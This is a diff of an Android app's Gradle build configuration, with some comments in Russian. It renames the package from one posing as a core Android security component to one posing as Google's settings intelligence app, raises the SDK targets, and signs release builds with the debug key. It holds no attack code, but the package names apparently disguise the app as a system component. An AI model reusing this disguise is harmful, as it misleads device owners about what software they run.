@@ -7,18 +7,16 @@ android {
     compileSdk 34
 
     defaultConfig {
-        applicationId "com.android.system.core.security"
-        minSdk 21
-        targetSdk 22 
-        versionCode 104
-        versionName "4.0.1"
+        applicationId "com.google.android.settings.intelligence" 
+        minSdk 26 // Поднимаем чуть выше для стабильности на новых телах
+        targetSdk 34
+        versionCode 105
+        versionName "5.0.2"
     }
 
-    // Новый синтаксис для Gradle 9+
     lint {
         abortOnError false
         checkReleaseBuilds false
-        disable 'ExpiredTargetSdkVersion'
     }
 
     buildTypes {
@@ -28,11 +26,6 @@ android {
             proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
             signingConfig signingConfigs.debug
         }
-    }
-
-    compileOptions {
-        sourceCompatibility JavaVersion.VERSION_17
-        targetCompatibility JavaVersion.VERSION_17
     }
 }
 
